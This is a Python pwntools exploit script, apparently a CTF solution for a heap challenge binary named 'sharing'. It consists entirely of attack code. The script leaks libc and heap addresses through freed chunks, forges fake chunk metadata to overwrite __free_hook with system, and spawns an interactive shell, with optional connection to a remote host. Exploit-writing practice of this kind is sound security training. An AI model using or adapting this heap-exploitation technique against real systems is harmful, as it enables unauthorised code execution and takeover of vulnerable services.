# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './sharing'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('Choice:',num)

def add( idx , size):
    cmd(1)
    sla("Idx" , idx)
    sla("Sz" , size)

def show( idx ):
    cmd(3)
    sla('Idx' , idx)

def edit( idx , content ):
    cmd(4)
    sla('Idx' , idx)
    sla('Content: ' , content)

def mov( a , b ):
    cmd(2)
    sla('From:' , a)
    sla('To:' , b)

def back(idx):
    cmd(0xDEAD)
    sla('Hint:' , idx)

# one_gad = one_gadget(libc.path)

add(0 , 0x500)
add(1 , 0x500)


mov(1 , 0)
add(2 , 0x500)

show(2)
leak = l64() - 0x70
libc.address = leak -libc.sym['__malloc_hook']

add(3 , 0x100)
add(4 , 0x100)
add(5 , 0x100)
add(6 , 0x100)

mov(4 , 3)
mov(6 , 5)
add(7 , 0x100)

show(7)
rl()
heap_addr = u64(p.recv(8))
fake_chunk = heap_addr - 2704

fake_ptr = flat(
    fake_chunk + 0x30 , fake_chunk + 0x20 
)
# fake ptr_list pointer

fake_ptr += flat(
    fake_chunk + 0x60 , 0x0000000100000002,
    0x100 , libc.sym['__free_hook'] ,
)
# fake info chunk

fake_ptr += flat(
    0 , 0x111
)

fake_ptr = fake_ptr.ljust(0x50 , '\x00') + p64(0xdeadbeef)*8

lg('fake_chunk',fake_chunk)

edit(2 , fake_ptr)
edit(374 , p64(libc.sym['system']))

add( 8 , 0x100)
add( 9 , 0x100)
edit( 8 , 'sh\x00')
mov( 9 , 8 )

# dbg()

p.interactive()

'''
@File    :   sharing.py
@Time    :   2021/09/12 10:50:26
@Author  :   Niyah 
'''